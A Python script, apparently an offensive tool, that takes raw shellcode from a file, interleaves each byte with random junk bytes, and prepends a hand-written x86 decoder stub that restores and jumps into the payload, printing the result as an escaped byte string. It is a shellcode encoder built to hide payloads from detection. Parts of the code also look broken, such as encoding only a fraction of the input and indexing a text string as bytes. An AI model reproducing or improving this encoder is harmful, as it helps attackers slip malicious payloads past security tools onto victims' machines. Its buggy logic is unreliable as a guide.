#!/usr/bin/env python
import time 
import random
import re
class ShellDeCode:
    def __init__(self):
       self.ReadRealShell() 
       self.DecoderHandel()
       self.WriteShellDecode()
    def ReadRealShell(self,**kwargs):
        with open('Xor1','r') as ReadBytesMode:
            ReadByMode =ReadBytesMode.read()
        return ReadByMode
    def DecoderHandel(self,**kwargs):
        VauleShell = self.ReadRealShell()
        StepsRound = [1, 2, 3]
        CharRandom = [chr(i) for i in range(256)]
        RetrunCount = 0
        random.seed(time.time())
        EndFinal = b""
        buf_length = len(VauleShell)//14
        for i in range(buf_length):
            EndFinal += bytes([VauleShell [i]])
            RetrunCount = random.choice(StepsRound)
            EndFinal += bytes([RetrunCount])
            for _ in range(1, RetrunCount):
                EndFinal += bytes(random.choice(CharRandom).encode())
       
        MovCL = b"\xb1\x90"
        MovCX = b"\x66\xb9\x90"
        JMP8Bits = b"\xeb\x2f\x90"
        JMP16Bits = b"\xeb\x31\x90"
        JMPStart8Bits = b"\xe8\xcc\x90"
        JMPStart16Bits = b"\xe8\xca\x90"
        DeCodeWay = b"MY_JMP_ENDER"+b"\x31\xc0\x31\xdb\x31\xd2\x31\xc9\x5a\x52\x89\xd6\x89\xd7\x46\x47"+\
            b"MY_CNT"+b"\x31\xc0\x31\xdb\x8a\x07\x01\xf8\x8a\x18\x88\x1e\x89\xc7\x47\x46\xe2\xee"+\
            b"\x59\xff\xd1\x31\xc0\xb0\x01\x31\xdb\xcd\x80"+b"MY_JMP_STARTER"+b"\xff\xff\xff"

        if    buf_length < 256:
                MovCL += buf_length.to_bytes(1, 'little')
                DeCodeWay = DeCodeWay.replace(b"MY_CNT", MovCL)
                DeCodeWay = DeCodeWay.replace(b"MY_JMP_ENDER", JMP8Bits)
                DeCodeWay = DeCodeWay.replace(b"MY_JMP_STARTER", JMPStart8Bits)
        else :
                MovCX += buf_length.to_bytes(2, 'little')
                DeCodeWay = DeCodeWay.replace(b"MY_CNT", MovCX)
                DeCodeWay = DeCodeWay.replace(b"MY_JMP_ENDER", JMP16Bits)
                DeCodeWay = DeCodeWay.replace(b"MY_JMP_STARTER", JMPStart16Bits)
        buf_array = [bytes([char]) for char in VauleShell ]
        StepsRound = [1, 2, 3]
        CharRandom = [chr(i) for i in range(256)]
        EndFinal = bytearray()
        for i in range(buf_length):
            EndFinal.extend(buf_array[i])
            RetrunCount = random.choice(StepsRound)
            EndFinal.extend(bytes([RetrunCount]))
            for _ in range(1, RetrunCount):
                EndFinal.extend(random.choice(CharRandom).encode())

        EndFinal = DeCodeWay + EndFinal
        return EndFinal
    def WriteShellDecode(self,**kwargs):
        PrintF = ""
        ShellCode = self.DecoderHandel()
        for i in range(len(ShellCode )):
            if i % 15 == 0:
                if i == 0:
                    PrintF +=('"')
                else:
                    PrintF +=("\n\"")
            PrintF +=("\\x{:02x}".format(ShellCode [i]).strip())
            if (i + 1) % 15 == 0 or i == len(ShellCode ) - 1:
                PrintF +=("\"")
                if i != len(ShellCode) - 1:
                    PrintF +=(",")
        
        with open("c",'w') as f :
            f.write(PrintF) 

        with open("c",'r') as f :
            print(f.read())
if __name__=='__main__':
   ShellDeCode() 
